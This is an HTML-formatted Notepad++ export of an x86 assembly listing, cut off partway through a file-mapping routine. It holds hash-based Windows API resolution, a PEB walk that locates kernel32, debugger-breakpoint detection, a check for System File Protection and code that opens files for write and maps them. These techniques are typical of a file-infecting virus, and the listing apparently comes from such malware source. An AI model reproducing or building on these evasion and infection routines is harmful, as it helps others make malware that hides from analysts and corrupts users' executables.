<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                           AllocateMemory                  ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; call diretly ntdll.NtAllocateVirtualMemory</span><span class="sc0">

</span><span class="sc1">; __in  : eax = alloc size</span><span class="sc0">
</span><span class="sc1">; __out : eax = ptr allocated mem </span><span class="sc0">
</span><span class="sc5">AllocateMem</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0E0762FEBh</span><span class="sc0"> </span><span class="sc1">; NtAllocateVirtualMemory   </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_ntdll</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressCrc</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@ll</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">detect_bpx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@ll</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
    
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@ll</span><span class="sc0"> 
    
</span><span class="sc5">@l2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@ll</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                              FreeMemory                   ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; call ntdll.NtFreeVirtualMemory</span><span class="sc0">

</span><span class="sc1">; eax = ptr buffer</span><span class="sc0">
</span><span class="sc1">; ecx = alloc size</span><span class="sc0">
</span><span class="sc5">FreeMem</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0E9D6CE5Eh</span><span class="sc0"> </span><span class="sc1">; NtFreeVirtualMemory   </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_ntdll</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressCrc</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> 
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
    
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                strlen                                     ;                   </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;in  : esi = ptr string</span><span class="sc0">
</span><span class="sc1">;out : eax = len</span><span class="sc0">
</span><span class="sc5">strlen</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     

</span><span class="sc5">strlen_loop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">strlen_end</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">strlen_loop</span><span class="sc0">

</span><span class="sc5">strlen_end</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                 CRC32                                     ;   </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; coded by berniee</span><span class="sc0">
</span><span class="sc1">; in  : esi = ptr string</span><span class="sc0">
</span><span class="sc1">; in  : eax = len of string</span><span class="sc0">
</span><span class="sc1">; out : eax = crc32</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc5">@0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> 
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;silmaril note ;) </span><span class="sc0">
                </span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> 
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0"> 
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0EDB88320h</span><span class="sc0"> 
                </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0"> 
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@0</span><span class="sc0"> 
                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                               GetKernel                  ; </span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; get kernel32 (PEB)</span><span class="sc0">
            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
</span><span class="sc5">get_kernel</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_kernel2</span><span class="sc0">

</span><span class="sc1">;search the InMemoryOrder module list for the kernel32 module using a hash of the module name for comparison.</span><span class="sc0">
</span><span class="sc1">;We also normalise the module name to uppercase as some systems store module names in uppercase and some in lowercase.</span><span class="sc0">
</span><span class="sc1">;http://www.harmonysecurity.com/blog/2009/06/retrieving-kernel32s-base-address.html</span><span class="sc0">

</span><span class="sc1">; such a complicated routine is needed for windows7 where there are two kernels (kernelBA,kernel32) in address space </span><span class="sc0">
</span><span class="sc1">; we need to obtain kernel32 as the kernelBA is missing some of needed APIS                 </span><span class="sc0">
</span><span class="sc5">get_kernel2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pushad</span><span class="sc0"> 
            </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; clear the direction flag for the loop</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; zero edx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get a pointer to the PEB</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get PEB-&gt;Ldr</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get the first module from the InMemoryOrder module list</span><span class="sc0">

</span><span class="sc5">next_mod</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get pointer to modules name (unicode string)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                 </span><span class="sc1">; set ecx to length for the loop</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; clear edi which will store the hash of the module name</span><span class="sc0">

</span><span class="sc5">loop_modname</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; clear eax</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; read in the next byte of the name</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">             </span><span class="sc1">; some versions of Windows use lower case module names</span><span class="sc0">
            </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">not_lowercase</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">; if so normalise to uppercase</span><span class="sc0">

</span><span class="sc5">not_lowercase</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">             </span><span class="sc1">; rotate right our hash value</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; add the next byte of the name to the hash</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_modname</span><span class="sc0">       </span><span class="sc1">; loop until we have read enough</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6A4ABC5Bh</span><span class="sc0">          </span><span class="sc1">; compare the hash with that of KERNEL32.DLL</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get this modules base address</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; get the next module</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_mod</span><span class="sc0">                </span><span class="sc1">; if it doesn't match, process the next module</span><span class="sc0">
                
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;save kernel base to eax</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">   

</span><span class="sc1">;--------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                               GetNtdll                                   ;</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------;</span><span class="sc0">
            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
</span><span class="sc5">get_ntdll</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">01Ch</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                          is SFC protected                 ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; in  : eax = ptr file name</span><span class="sc0">
</span><span class="sc1">; out : if 0 &lt; ret =&gt; is protected </span><span class="sc0">
            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">vars</span><span class="sc0">
</span><span class="sc5">IsSfcProtected</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">  
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aGetCurrentDirectory</span><span class="sc0"> </span><span class="sc1">; GetCurrentDirectory</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aMultiByteToWideChar</span><span class="sc0"> </span><span class="sc1">; MultiByteToWideChar</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aSfcIsFileProtected</span><span class="sc0"> </span><span class="sc1">; SfcIsFileProtected</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                             map file                  ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; __in  : eax = filename</span><span class="sc0">
</span><span class="sc1">; __in  : ecx = map_size </span><span class="sc0">
</span><span class="sc1">; __out : eax = mapped image</span><span class="sc0">
</span><span class="sc1">;         eax = 0 -&gt; error occured  </span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; MapViewofFile -&gt; map_size</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0"> 
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aCreateFile</span><span class="sc0"> </span><span class="sc1">; CreateFile</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.hFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; hFile</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">MapBadEnd2</span><span class="sc0">
        
            </span><span class="sc1">; map file to memory</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
